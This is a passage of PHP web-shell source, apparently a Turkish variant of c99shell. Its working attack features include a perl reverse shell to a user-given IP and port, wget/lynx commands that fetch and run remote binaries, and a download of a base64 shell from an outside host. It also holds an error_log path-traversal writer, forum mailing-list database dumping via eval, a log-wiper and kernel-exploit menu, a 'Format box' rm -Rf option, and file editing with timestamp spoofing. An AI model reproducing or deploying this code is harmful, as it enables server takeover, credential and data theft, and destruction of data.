fclose($flux);
 myshellexec("perl $ircpath");
myshellexec("rm $ircpath");
 
 
 
echo "<center><font color=red><b> $ircadmin ,$ircserver a$irclabel ismi ile baglaniyorum</b></font></center>";
 
 }
 
 
 
 ?>
 
 
 
 


<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="116" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
<tr><td height="1" valign="top" colspan="2"><p align="center"><b>:: <a href="<?php echo $surl; ?>act=cmd&d=<?php echo urlencode($d); ?>"><b>File Stealer Function Ripped fRom Tontonq 's File Stealer ... </b></a> ::</b></p></td></tr>
<tr>
<td width="50%" height="83" valign="top"><center>
 <div align="center"><b>Error_Log SAfe Mode Bypass By Psych0 ;)</b>
 <form action="<?php echo $surl; ?>" method="POST">
 <input type=hidden name=act value=tools>
 <textarea name="erorr" cols=100 rows=10></textarea></br>
 <input type="text" name="nere" value="<?if ($win) {echo substr($real,3)."\defeace.php";} else {echo $real."\defeace.php";}?> "size=102>
 <input type="submit" value="write 2 file" name="c100y">
 <input type="submit" value="c100 yaz !!!!" >
 </form>
 
 
 
 
 
 
 
 
 
 
 
 </div>
 
 </td>
<td width="50%" height="83" valign="top"><center>
<center>
<form action="<?php echo $surl; ?>" method="POST">
<input type=hidden name=act value=tools>
Dosyanin Adresi ? = <input type="text" name="dosyaa" size="81" maxlength=500value="http://psych0.kayyo.com/sploitz.zip"><br><br> 
Nereya Kaydolcak? = <input type="text" name="yeniyer" size=81 maxlength=191 value="<?php echo "$real/sploitz.zip"; ?>"><br><br> 
<input type=submit class='stealthSubmit' Value='Dosyayi Chek'> 
</form>
<br><br><br>




</center>

</center>
 </td>
</tr></TABLE>

<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="116" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1> 
<tr><td height="1" valign="top" colspan="2"><p align="center"><b>:: <a href="<?php echo $surl; ?>act=cmd&d=<?php echo urlencode($d); ?>"><b>Preddy's tricks :D </b></a> ::</b></p></td></tr> 
<tr> 
<td width="50%" height="83" valign="top"><center> 
 <div align="center">Php Safe-Mode Bypass (Read Files) 
 </div><br> 
 <form action="<?php echo $PHP_SELF; ?>"> 
<div align="center"> 
File: <input type="text" name="file" method="get"> <input type="submit" value="Read File"><br><br> eg: /etc/passwd<br> 
 
 
 

 
 

 <br> 
</div> 
 </form> 
 </td> 
<td width="50%" height="83" valign="top"><center> 
<center>Php Safe-Mode Bypass (List Directories):<form action="<?php echo $PHP_SElf; ?>"> 
<div align="center"><br> 
Dir: <input type="text" name="directory" method="get"> <input type="submit" value="List Directory"><br><br> eg: /etc/<br> 

 </form></center> 
 </td> 
</tr></TABLE> 

 
<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="116" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1> 
<tr><td height="1" valign="top" colspan="2"><p align="center"><b>:: <a href="<?php echo $surl; ?>act=cmd&d=<?php echo urlencode($d); ?>"><b>Psych0 RulaZz</b></a> ::</b></p></td></tr> 
<tr> 
<td width="50%" height="83" valign="top"><center> 
 <div align="center">Useful Commands
 </div> 
 <form action="<?php echo $PHP_SElf; ?>"> 
<div align="center"> 
<input type=hidden name=act value="cmd"> 
<input type=hidden name="d" value="<?php echo $dispd; ?>"> 
 <SELECT NAME="cmd"> 
<OPTION VALUE="uname -a">Kernel version 
<OPTION VALUE="w">Logged in users 
 <OPTION VALUE="lastlog">Last to connect 
<OPTION VALUE="find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null">Suid bins 
<OPTION VALUE="cut -d: -f1,2,3 /etc/passwd | grep ::">USER WITHOUT PASSWORD! 
<OPTION VALUE="find /etc/ -type f -perm -o+w 2> /dev/null">Write in /etc/? 
<OPTION VALUE="which wget curl w3m lynx">Downloaders? 
<OPTION VALUE="cat /proc/version /proc/cpuinfo">CPUINFO 
<OPTION VALUE="netstat -atup | grep IST">Open ports 
<OPTION VALUE="locate gcc">gcc installed? 
<OPTION VALUE="rm -Rf">Format box (DANGEROUS) 
<OPTION VALUE="wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c">WIPELOGS PT1 (If wget installed) 
<OPTION VALUE="gcc zap2.c -o zap2">WIPELOGS PT2 
<OPTION VALUE="./zap2">WIPELOGS PT3 
<OPTION VALUE="wget http://ftp.powernet.com.tr/supermail/debug/k3">Kernel attack (Krad.c) PT1 (If wget installed) 
<OPTION VALUE="./k3 1">Kernel attack (Krad.c) PT2 (L1) 
<OPTION VALUE="./k3 2">Kernel attack (Krad.c) PT2 (L2) 
<OPTION VALUE="./k3 3">Kernel attack (Krad.c) PT2 (L3) 
<OPTION VALUE="./k3 4">Kernel attack (Krad.c) PT2 (L4) 
<OPTION VALUE="./k3 5">Kernel attack (Krad.c) PT2 (L5) 
</SELECT> 
<input type=hidden name="cmd_txt" value="1"> 
&nbsp; 
<input type=submit name=submit value="Execute"> 
 <br> 
Warning. Kernel may be alerted using higher levels </div> 
 </form> 
 </td> 
<td width="50%" height="83" valign="top"><center> 
<center><b>:: ...Maillist Stealer ... ::


<form name="form1" method="post" action="<?echo $PHP_SElf;?>"> 
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<select name="destoyew">
<option value="-" name="--">----------------------------------------------
<option value="wbb" name="wbb">-----------------wbb------------------------
<option value="smf" name="smf">-----------------smf-------------------------
<option value="phpbb" name="phpbb">----------------phpbb-----------------------
<option value="vb" name="vb">--------------vbulletin-----------------------
</select>
<br>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Db ismi <input type="text" name="isimofdb" value="wbb"><br>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Db Server<input type="text" name="serverofdb" value="localhost"><br>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Db user <input type="text" name="kulofdb" value="root"><br>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Db Pass<input type="text" name="passofdb"><br>
<input type=submit name="dumpc" VALUE="Dump The Maillist"> 



 </form>

 <?
 
 
 if (isset($_POST['dumpc']))
 {
 $zirt=$_POST['destoyew'];
 
$db_ismi=$_POST['isimofdb'];
$db_serveri=$_POST['serverofdb'];
$db_passi=$_POST['passofdb'];
$db_kuli=$_POST['kulofdb'];
switch($zirt)
{
case 'wbb':

$alici=sprintf($alici,$db_ismi,$db_serveri,$db_kuli,$db_passi,'bb1_users',4);

 eval("$alici"); 

 
break;



case 'vb': 
$alici=sprintf($alici,$db_ismi,$db_serveri,$db_kuli,$db_passi,'user',7);

 eval("$alici"); 

break;

case 'smf':
$alici=sprintf($alici,$db_ismi,$db_serveri,$db_kuli,$db_passi,'smf_members',14);

 eval("$alici"); 

break;


case 'phpbb':
$alici=sprintf($alici,$db_ismi,$db_serveri,$db_kuli,$db_passi,'phpbb_users',34);

 eval("$alici"); 

break;


}
 
 
}
 

 ?>

 </center> 
 </td> 
</tr></TABLE><br> 

<?php 

if (isset($_POST['dosyaa']))
{
dosyayicek($_POST['dosyaa'],$_POST['yeniyer']);

}
if (!empty($_GET['ipi']) && !empty($_GET['pipi'])) 
{ 
 cf("/tmp/back",$back_connect); 
 $p2=which("perl"); 
 $blah = ex($p2." /tmp/back ".$_GET['ipi']." ".$_GET['pipi']." &"); 
echo"<b>Now script try connect to ".$_GET['ipi']." port ".$_GET['pipi']." ...</b>"; 
} 
if (!empty($_GET['dolma'])) 
{
$sayko=htmlspecialchars($_GET['dolma']); 
if ($sayko == "wgetcan") 
{ 

myshellexec("wget $adires -O sayko_bind;chmod 777 sayko_bind;./sayko_bind"); 


} 

else if ($sayko =="freadcan") 
{ 
dosyayicek($adires,"sayko_bind");
myshellexec("./sayko_bind");
} 

else if ($sayko == "lynxcan") 
{ 
myshellexec("lynx -dump $adires > sayko_bind;chmod 777 sayko_bind;./sayko_bind"); 

} 





} 

if(!empty($_POST['erorr']) || isset($_POST['erorr'])) 
{

if (isset($_POST['c100y'])){

if
(error_log($_POST['erorr'], 3, "php://../../../../../../../../".$_POST['nere']))
{
echo "<center><font color=red><b>Dehset yazarim</b></font></center>";

}

else
{

echo "<center><font color=red><b>YAzamadim abi .... </b></font></center>";
}

}

else {
$c100c=base64_decode(dosyicek("http://sistemdata.be/base.txt"));

if
(error_log($c100c, 3, "php://../../../../../../../../".$_POST['nere']))
{
echo "<center><font color=red><b>yazdim c100 u gir dait :D</b></font></center>";

}

else
{

echo "<center><font color=red><b>YAzamadim abi .... </b></font></center>";
}


}




} 
}
if ($act == "processes") 
{ 
 echo "<b>Processes:</b><br>"; 
 if (!$win) {$handler = "ps -aux".($grep?" | grep '".addslashes($grep)."'":"");} 
 else {$handler = "tasklist";} 
 $ret = myshellexec($handler); 
 if (!$ret) {echo "Can't execute \"".$handler."\"!";} 
 else 
 { 
if (empty($processes_sort)) {$processes_sort = $sort_default;} 
$parsesort = parsesort($processes_sort); 
if (!is_numeric($parsesort[0])) {$parsesort[0] = 0;} 
$k = $parsesort[0]; 
if ($parsesort[1] != "a") {$y = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."a\"><img src=\"".$surl."act=img&img=sort_desc\" height=\"9\" width=\"14\" border=\"0\"></a>";} 
else {$y = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."d\"><img src=\"".$surl."act=img&img=sort_asc\" height=\"9\" width=\"14\" border=\"0\"></a>";} 
$ret = htmlspecialchars($ret); 
if (!$win) 
{ 
if ($pid) 
{ 
 if (is_null($sig)) {$sig = 9;} 
 echo "Sending signal ".$sig." to #".$pid."... "; 
 if (posix_kill($pid,$sig)) {echo "OK.";} 
 else {echo "ERROR.";} 
} 
while (ereg("",$ret)) {$ret = str_replace(""," ",$ret);} 
$stack = explode("\n",$ret); 
$head = explode(" ",$stack[0]); 
unset($stack[0]); 
for($i=0;$i<count($head);$i++) 
{ 
 if ($i != $k) {$head[$i] = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$i.$parsesort[1]."\"><b>".$head[$i]."</b></a>";} 
} 
$prcs = array(); 
foreach ($stack as $line) 
{ 
 if (!empty($line)) 
{ 
 echo "<tr>"; 
$line = explode(" ",$line); 
$line[10] = join(" ",array_slice($line,10)); 
$line = array_slice($line,0,11); 
if ($line[0] == get_current_user()) {$line[0] = "<font color=green>".$line[0]."</font>";} 
$line[] = "<a href=\"".$surl."act=processes&d=".urlencode($d)."&pid=".$line[1]."&sig=9\"><u>KILL</u></a>"; 
$prcs[] = $line; 
echo "</tr>"; 
 } 
} 
} 
else 
{ 
while (ereg("",$ret)) {$ret = str_replace("","",$ret);} 
while (ereg("",$ret)) {$ret = str_replace("","",$ret);} 
while (ereg("",$ret)) {$ret = str_replace("","",$ret);} 
while (ereg("",$ret)) {$ret = str_replace("","",$ret);} 
while (ereg("",$ret)) {$ret = str_replace("","",$ret);} 
while (ereg("",$ret)) {$ret = str_replace("","",$ret);} 
while (ereg("",$ret)) {$ret = str_replace("","",$ret);} 
while (ereg("",$ret)) {$ret = str_replace("","",$ret);} 
while (ereg("",$ret)) {$ret = str_replace("","",$ret);} 
while (ereg("",$ret)) {$ret = str_replace("","",$ret);} 
while (ereg(" ",$ret)) {$ret = str_replace(" ","",$ret);} 
$ret = convert_cyr_string($ret,"d","w"); 
$stack = explode("\n",$ret); 
unset($stack[0],$stack[2]); 
$stack = array_values($stack); 
$head = explode("",$stack[0]); 
$head[1] = explode(" ",$head[1]); 
$head[1] = $head[1][0]; 
$stack = array_slice($stack,1); 
unset($head[2]); 
$head = array_values($head); 
if ($parsesort[1] != "a") {$y = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."a\"><img src=\"".$surl."act=img&img=sort_desc\" height=\"9\" width=\"14\" border=\"0\"></a>";} 
else {$y = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."d\"><img src=\"".$surl."act=img&img=sort_asc\" height=\"9\" width=\"14\" border=\"0\"></a>";} 
if ($k > count($head)) {$k = count($head)-1;} 
for($i=0;$i<count($head);$i++) 
{ 
 if ($i != $k) {$head[$i] = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$i.$parsesort[1]."\"><b>".trim($head[$i])."</b></a>";} 
} 
$prcs = array(); 
foreach ($stack as $line) 
{ 
 if (!empty($line)) 
 { 
echo "<tr>"; 
$line = explode("",$line); 
$line[1] = intval($line[1]); $line[2] = $line[3]; unset($line[3]); 
$line[2] = intval(str_replace(" ","",$line[2]))*1024;
$prcs[] = $line; 
echo "</tr>"; 
 } 
} 
} 
$head[$k] = "<b>".$head[$k]."</b>".$y; 
$v = $processes_sort[0]; 
usort($prcs,"tabsort"); 
if ($processes_sort[1] == "d") {$prcs = array_reverse($prcs);} 
$tab = array(); 
$tab[] = $head; 
$tab = array_merge($tab,$prcs); 
echo "<TABLE height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor=\"#C0C0C0\">"; 
foreach($tab as $i=>$k) 
{ 
echo "<tr>"; 
foreach($k as $j=>$v) {if ($win and $i > 0 and $j == 2) {$v = view_size($v);} echo "<td>".$v."</td>";} 
echo "</tr>"; 
} 
echo "</table>"; 
 } 
} 
if ($act == "eval") 
{ 
 if (!empty($eval)) 
 { 
echo "<b>Result of execution this PHP-code</b>:<br>"; 
$tmp = ob_get_contents(); 
$olddir = realpath("."); 
@chdir($d); 
if ($tmp) 
{ 
ob_clean(); 
eval($eval); 
$ret = ob_get_contents(); 
$ret = convert_cyr_string($ret,"d","w"); 
ob_clean(); 
echo $tmp; 
if ($eval_txt) 
{ 
 $rows = count(explode("\r\n",$ret))+1; 
 if ($rows < 10) {$rows = 10;} 
 echo "<br><textarea cols=\"122\" rows=\"".$rows."\" readonly>".htmlspecialchars($ret)."</textarea>"; 
} 
else {echo $ret."<br>";} 
} 
else 
{ 
if ($eval_txt) 
{ 
 echo "<br><textarea cols=\"122\" rows=\"15\" readonly>"; 
 eval($eval); 
 echo "</textarea>"; 
} 
else {echo $ret;} 
} 
@chdir($olddir); 
 } 
 else {echo "<b>Execution PHP-code</b>"; if (empty($eval_txt)) {$eval_txt = TRUE;}} 
 echo "<form action=\"".$surl."\" method=POST><input type=hidden name=act value=eval><textarea name=\"eval\" cols=\"122\" rows=\"10\">".htmlspecialchars($eval)."</textarea><input type=hidden name=\"d\" value=\"".$dispd."\"><br><br><input type=submit value=\"Execute\">&nbsp;Display in text-area&nbsp;<input type=\"checkbox\" name=\"eval_txt\" value=\"1\""; if ($eval_txt) {echo " checked";} echo "></form>"; 
} 
if ($act == "f") 
{ 
 if ((!is_readable($d.$f) or is_dir($d.$f)) and $ft != "edit") 
 { 
if (file_exists($d.$f)) {echo "<center><b>Permision denied (".htmlspecialchars($d.$f).")!</b></center>";} 
else {echo "<center><b>File does not exists (".htmlspecialchars($d.$f).")!</b><br><a href=\"".$surl."act=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."&c=1\"><u>Create</u></a></center>";} 
 } 
 else 
 { 
$r = @file_get_contents($d.$f); 
$ext = explode(".",$f); 
$c = count($ext)-1; 
$ext = $ext[$c]; 
$ext = strtolower($ext); 
$rft = ""; 
foreach($ftypes as $k=>$v) {if (in_array($ext,$v)) {$rft = $k; break;}} 
if (eregi("sess_(.*)",$f)) {$rft = "phpsess";} 
if (empty($ft)) {$ft = $rft;} 
$arr = array( 
array("<img src=\"".$surl."act=img&img=ext_diz\" border=\"0\">","info"), 
array("<img src=\"".$surl."act=img&img=ext_html\" border=\"0\">","html"), 
array("<img src=\"".$surl."act=img&img=ext_txt\" border=\"0\">","txt"), 
array("Code","code"), 
array("Session","phpsess"), 
array("<img src=\"".$surl."act=img&img=ext_exe\" border=\"0\">","exe"), 
array("SDB","sdb"), 
array("<img src=\"".$surl."act=img&img=ext_gif\" border=\"0\">","img"), 
array("<img src=\"".$surl."act=img&img=ext_ini\" border=\"0\">","ini"), 
array("<img src=\"".$surl."act=img&img=download\" border=\"0\">","download"), 
array("<img src=\"".$surl."act=img&img=ext_rtf\" border=\"0\">","notepad"), 
array("<img src=\"".$surl."act=img&img=change\" border=\"0\">","edit") 
); 
echo "<b>Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;<img src=\"".$surl."act=img&img=ext_".$ext."\" border=\"0\">&nbsp;".$f." (".view_size(filesize($d.$f)).") &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".view_perms_color($d.$f)."</b><br>Select action/file-type:<br>"; 
foreach($arr as $t) 
{ 
if ($t[1] == $rft) {echo " <a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><font color=green>".$t[0]."</font></a>";} 
elseif ($t[1] == $ft) {echo " <a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><b><u>".$t[0]."</u></b></a>";} 
else {echo " <a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><b>".$t[0]."</b></a>";} 
echo " (<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&white=1&d=".urlencode($d)."\" target=\"_blank\">+</a>) |"; 
} 
echo "<hr size=\"1\" noshade>"; 
if ($ft == "info") 
{ 
echo "<b>Information:</b><table border=0 cellspacing=1 cellpadding=2><tr><td><b>Path</b></td><td> ".$d.$f."</td></tr><tr><td><b>Size</b></td><td> ".view_size(filesize($d.$f))."</td></tr><tr><td><b>MD5</b></td><td> ".md5_file($d.$f)."</td></tr>"; 
if (!$win) 
{ 
 echo "<tr><td><b>Owner/Group</b></td><td> ";
 $ow = posix_getpwuid(fileowner($d.$f)); 
 $gr = posix_getgrgid(filegroup($d.$f)); 
 echo ($ow["name"]?$ow["name"]:fileowner($d.$f))."/".($gr["name"]?$gr["name"]:filegroup($d.$f)); 
} 
echo "<tr><td><b>Perms</b></td><td><a href=\"".$surl."act=chmod&f=".urlencode($f)."&d=".urlencode($d)."\">".view_perms_color($d.$f)."</a></td></tr><tr><td><b>Create time</b></td><td> ".date("d/m/Y H:i:s",filectime($d.$f))."</td></tr><tr><td><b>Access time</b></td><td> ".date("d/m/Y H:i:s",fileatime($d.$f))."</td></tr><tr><td><b>MODIFY time</b></td><td> ".date("d/m/Y H:i:s",filemtime($d.$f))."</td></tr></table><br>"; 
$fi = fopen($d.$f,"rb"); 
if ($fi) 
{ 
 if ($fullhexdump) {echo "<b>FULL HEXDUMP</b>"; $str = fread($fi,filesize($d.$f));} 
 else {echo "<b>HEXDUMP PREVIEW</b>"; $str = fread($fi,$hexdump_lines*$hexdump_rows);} 
 $n = 0; 
 $a0 = "00000000<br>"; 
 $a1 = ""; 
 $a2 = ""; 
 for ($i=0; $i<strlen($str); $i++) 
 { 
$a1 .= sprintf("%02X",ord($str[$i]))." "; 
switch (ord($str[$i])) 
{ 
case 0:$a2 .= "<font>0</font>"; break; 
case 32: 
case 10: 
case 13: $a2 .= "&nbsp;"; break; 
default: $a2 .= htmlspecialchars($str[$i]); 
} 
$n++; 
if ($n == $hexdump_rows) 
{ 
$n = 0; 
if ($i+1 < strlen($str)) {$a0 .= sprintf("%08X",$i+1)."<br>";} 
$a1 .= "<br>"; 
$a2 .= "<br>"; 
} 
 } 
 //if ($a1 != "") {$a0 .= sprintf("%08X",$i)."<br>";} 
 echo "<table border=0 bgcolor=#666666 cellspacing=1 cellpadding=4><tr><td bgcolor=#666666>".$a0."</td><td bgcolor=000000>".$a1."</td><td bgcolor=000000>".$a2."</td></tr></table><br>"; 
} 
$encoded = ""; 
if ($base64 == 1) 
{ 
 echo "<b>Base64 Encode</b><br>"; 
 $encoded = base64_encode(file_get_contents($d.$f)); 
} 
elseif($base64 == 2) 
{ 
 echo "<b>Base64 Encode + Chunk</b><br>"; 
 $encoded = chunk_split(base64_encode(file_get_contents($d.$f))); 
} 
elseif($base64 == 3) 
{ 
 echo "<b>Base64 Encode + Chunk + Quotes</b><br>"; 
 $encoded = base64_encode(file_get_contents($d.$f)); 
 $encoded = substr(preg_replace("!.{1,76}!","'\\0'.\n",$encoded),0,-2); 
} 
elseif($base64 == 4) 
{ 
 $text = file_get_contents($d.$f); 
 $encoded = base64_decode($text); 
 echo "<b>Base64 Decode"; 
 if (base64_encode($encoded) != $text) {echo " (failed)";} 
 echo "</b><br>"; 
} 
if (!empty($encoded)) 
{ 
 echo "<textarea cols=80 rows=10>".htmlspecialchars($encoded)."</textarea><br><br>"; 
} 
echo "<b>HEXDUMP:</b><nobr> [<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&fullhexdump=1&d=".urlencode($d)."\">Full</a>] [<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&d=".urlencode($d)."\">Preview</a>]<br><b>Base64: </b> 
<nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=1&d=".urlencode($d)."\">Encode</a>]&nbsp;</nobr> 
<nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=2&d=".urlencode($d)."\">+chunk</a>]&nbsp;</nobr> 
<nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=3&d=".urlencode($d)."\">+chunk+quotes</a>]&nbsp;</nobr> 
<nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=4&d=".urlencode($d)."\">Decode</a>]&nbsp;</nobr> 
<P>"; 
} 
elseif ($ft == "html") 
{ 
if ($white) {@ob_clean();} 
echo $r; 
if ($white) {c99shexit();} 
} 
elseif ($ft == "txt") {echo "<pre>".htmlspecialchars($r)."</pre>";} 
elseif ($ft == "ini") {echo "<pre>"; var_dump(parse_ini_file($d.$f,TRUE)); echo "</pre>";} 
elseif ($ft == "phpsess") 
{ 
echo "<pre>"; 
$v = explode("|",$r); 
echo $v[0]."<br>"; 
var_dump(unserialize($v[1])); 
echo "</pre>"; 
} 
elseif ($ft == "exe") 
{ 
$ext = explode(".",$f); 
$c = count($ext)-1; 
$ext = $ext[$c]; 
$ext = strtolower($ext); 
$rft = ""; 
foreach($exeftypes as $k=>$v) 
{ 
 if (in_array($ext,$v)) {$rft = $k; break;} 
} 
$cmd = str_replace("%f%",$f,$rft); 
echo "<b>Execute file:</b><form action=\"".$surl."\" method=POST><input type=hidden name=act value=cmd><input type=\"text\" name=\"cmd\" value=\"".htmlspecialchars($cmd)."\" size=\"".(strlen($cmd)+2)."\"><br>Display in text-area<input type=\"checkbox\" name=\"cmd_txt\" value=\"1\" checked><input type=hidden name=\"d\" value=\"".htmlspecialchars($d)."\"><br><input type=submit name=submit value=\"Execute\"></form>"; 
} 
elseif ($ft == "sdb") {echo "<pre>"; var_dump(unserialize(base64_decode($r))); echo "</pre>";} 
elseif ($ft == "code") 
{ 
if (ereg("php"."BB 2.(.*) auto-generated config file",$r)) 
{ 
 $arr = explode("\n",$r); 
 if (count($arr == 18)) 
 { 
include($d.$f); 
echo "<b>phpBB configuration is detected in this file!<br>"; 
if ($dbms == "mysql4") {$dbms = "mysql";} 
if ($dbms == "mysql") {echo "<a href=\"".$surl."act=sql&sql_server=".htmlspecialchars($dbhost)."&sql_login=".htmlspecialchars($dbuser)."&sql_passwd=".htmlspecialchars($dbpasswd)."&sql_port=3306&sql_db=".htmlspecialchars($dbname)."\"><b><u>Connect to DB</u></b></a><br><br>";} 
else {echo "But, you can't connect to forum sql-base, because db-software=\"".$dbms."\" is not supported by c99shell. Please, report us for fix.";} 
echo "Parameters for manual connect:<br>"; 
$cfgvars = array("dbms"=>$dbms,"dbhost"=>$dbhost,"dbname"=>$dbname,"dbuser"=>$dbuser,"dbpasswd"=>$dbpasswd); 
foreach ($cfgvars as $k=>$v) {echo htmlspecialchars($k)."='".htmlspecialchars($v)."'<br>";} 
echo "</b><hr size=\"1\" noshade>"; 
 } 
} 
if (ereg("// Number of this Forum",$r)) 
{ 
 $arr = explode("\n",$r); 
 if (count($arr == 18)) 
 { 
include($d.$f); 
echo "<b>phpBB configuration is detected in this file!<br>"; 
if ($dbms == "mysql4") {$dbms = "mysql";} 
if ($dbms == "mysql") {echo "<a href=\"".$surl."act=sql&sql_server=".htmlspecialchars($dbhost)."&sql_login=".htmlspecialchars($dbuser)."&sql_passwd=".htmlspecialchars($dbpasswd)."&sql_port=3306&sql_db=".htmlspecialchars($dbname)."\"><b><u>Connect to DB</u></b></a><br><br>";} 
else {echo "But, you can't connect to forum sql-base, because db-software=\"".$dbms."\" is not supported by c99shell. Please, report us for fix.";} 
echo "Parameters for manual connect:<br>"; 
$cfgvars = array("dbms"=>$dbms,"dbhost"=>$dbhost,"dbname"=>$dbname,"dbuser"=>$dbuser,"dbpasswd"=>$dbpasswd); 
foreach ($cfgvars as $k=>$v) {echo htmlspecialchars($k)."='".htmlspecialchars($v)."'<br>";} 
echo "</b><hr size=\"1\" noshade>"; 
 } 
} 



echo "<div style=\"border : 0px solid #FFFFFF; padding: 1em; margin-top: 1em; margin-bottom: 1em; margin-right: 1em; margin-left: 1em; background-color: ".$highlight_background .";\">"; 
if (!empty($white)) {@ob_clean();} 
highlight_file($d.$f); 
if (!empty($white)) {c99shexit();} 
echo "</div>"; 
} 
elseif ($ft == "download") 
{ 
@ob_clean(); 
header("Content-type: application/octet-stream"); 
header("Content-length: ".filesize($d.$f)); 
header("Content-disposition: attachment; filename=\"".$f."\";"); 
echo $r; 
exit; 
} 
elseif ($ft == "notepad") 
{ 
@ob_clean(); 
header("Content-type: text/plain"); 
header("Content-disposition: attachment; filename=\"".$f.".txt\";"); 
echo($r); 
exit; 
} 
elseif ($ft == "img") 
{ 
$inf = getimagesize($d.$f); 
if (!$white) 
{ 
 if (empty($imgsize)) {$imgsize = 20;} 
 $width = $inf[0]/100*$imgsize; 
 $height = $inf[1]/100*$imgsize; 
 echo "<center><b>Size:</b>&nbsp;"; 
 $sizes = array("100","50","20"); 
 foreach ($sizes as $v) 
 { 
echo "<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=img&d=".urlencode($d)."&imgsize=".$v."\">"; 
if ($imgsize != $v ) {echo $v;} 
else {echo "<u>".$v."</u>";} 
echo "</a>&nbsp;&nbsp;&nbsp;"; 
 } 
 echo "<br><br><img src=\"".$surl."act=f&f=".urlencode($f)."&ft=img&white=1&d=".urlencode($d)."\" width=\"".$width."\" height=\"".$height."\" border=\"1\"></center>"; 
} 
else 
{ 
 @ob_clean(); 
 $ext = explode($f,"."); 
 $ext = $ext[count($ext)-1]; 
 header("Content-type: ".$inf["mime"]); 
 readfile($d.$f); 
 exit; 
} 
} 
elseif ($ft == "edit") 
{ 
if (!empty($submit)) 
{ 
 if ($filestealth) {$stat = stat($d.$f);} 
 $fp = fopen($d.$f,"w"); 
 if (!$fp) {echo "<b>Can't write to file!</b>";} 
 else 
 { 
echo "<b>Saved!</b>"; 
fwrite($fp,$edit_text); 
fclose($fp); 
if ($filestealth) {touch($d.$f,$stat[9],$stat[8]);} 
$r = $edit_text; 
 } 
} 
$rows = count(explode("\r\n",$r)); 
if ($rows < 10) {$rows = 10;} 
if ($rows > 30) {$rows = 30;} 
echo "<form action=\"".$surl."act=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."\" method=POST><input type=submit name=submit value=\"Save\">&nbsp;<input type=\"reset\" value=\"Reset\">&nbsp;<input type=\"button\" onclick=\"location.href='".addslashes($surl."act=ls&d=".substr($d,0,-1))."';\" value=\"Back\"><br><textarea name=\"edit_text\" cols=\"122\" rows=\"".$rows."\">".htmlspecialchars($r)."</textarea></form>"; 
} 
elseif (!empty($ft)) {echo "<center><b>Manually selected type is incorrect. If you think, it is mistake, please send us url and dump of \$GLOBALS.</b></center>";} 
else {echo "<center><b>Unknown extension (".$ext."), please, select type manually.</b></center>";} 
 } 
} 
} 
else 
{ 
 @ob_clean(); 
 $images = array( 
"Success"=>
"R0lGODlhGgAVAPcAAKHMn/v7+8/Pz+7u7me3Ytjs1kurRXi/c9bW1vLy8sznyt/f31myVD+l
OOXz5fL58rzguuLi4jOgLMzMzP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
